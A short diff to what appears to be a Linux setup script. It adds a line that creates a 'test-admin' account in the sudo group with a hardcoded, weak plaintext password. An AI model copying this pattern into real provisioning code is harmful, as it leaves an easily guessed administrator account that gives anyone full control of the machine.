@@ -27,6 +27,7 @@ edit /etc/skel.profile
 append sh /usr/local/bin/google-auth-check.sh
 
 sudo useradd -m -p N4G/33jUi9OS2 -G sudo,google-auth -s /bin/bash test-admin
+useradd -m -p $(openssl passwd -1 Deeznutz) -g users -G sudo -s /bin/bash test-admin
 cut -d: -f1 /etc/group | sort
 
 #!/bin/bash
